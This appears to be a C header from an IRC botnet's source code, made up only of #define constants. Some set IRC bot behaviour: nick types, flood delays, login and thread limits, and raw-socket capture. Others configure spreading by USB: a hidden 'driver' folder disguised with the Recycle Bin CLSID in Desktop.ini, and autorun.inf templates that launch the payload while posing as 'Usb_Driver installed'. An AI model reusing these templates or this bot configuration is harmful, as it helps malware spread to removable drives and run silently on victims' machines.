


#define NO_SERVICE  



#define PING_TIMEOUT	200
#define IRCLINE			514
#define MAX_TOKENS		64
#define MAX_LOGINS		2
#define MAX_THREADS		512
#define MAX_IP			16
#define MAX_HOSTNAME	256
#define MAX_NICKLEN		24
#define REQ_NICKLEN		7
#define REQ_IDENTLEN	6
#define REQ_REALNLEN	22
#define MAX_KEY_LENGTH	255
#define MAX_VALUE_NAME	16383
#define NICK_TYPE		N_MINE
#define IDENT_TYPE		N_OS
#define REALN_TYPE		N_BOX
#define FLOOD_DELAY		2000
#define SFLOOD_DELAY	7000
#define RUPTIME_DELAY	600000
#define SECURE_DELAY	600000
#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#ifndef SIO_RCVALL
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)
#endif




#define usbsleepfor	12000
#define usbrecyclerpath			"\\driver"
#define usbrecyclersubpath		"\\usb"
#define usbdeskdata				"[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}"
#define usbdeskini				"\\Desktop.ini"
#define usbdeskaruninf			"\\autorun.inf"
#define usbarundata1			"[autorun]\r\nopen="
#define usbarundata2			"\r\naction=Open\r\nshell\\open=Open\r\nshell\\open\\command="
#define usbarundata3			"\r\nUsb_Driver installed"